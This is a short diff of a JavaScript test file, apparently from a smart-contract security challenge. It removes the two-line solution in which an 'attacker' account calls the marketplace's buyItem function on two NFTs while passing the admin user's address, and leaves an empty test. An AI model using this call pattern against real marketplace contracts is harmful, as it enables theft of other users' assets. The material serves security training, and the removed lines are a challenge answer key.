@@ -65,9 +65,6 @@ before(async () => {
 
 it("solves the challenge", async function () {
 
-  await bonanzaMarketplace.connect(attacker).buyItem(nftA.address,0,await adminUser.getAddress(),0)
-  await bonanzaMarketplace.connect(attacker).buyItem(nftB.address,0,await adminUser.getAddress(),0)
-
 });
 
 /// expected final state
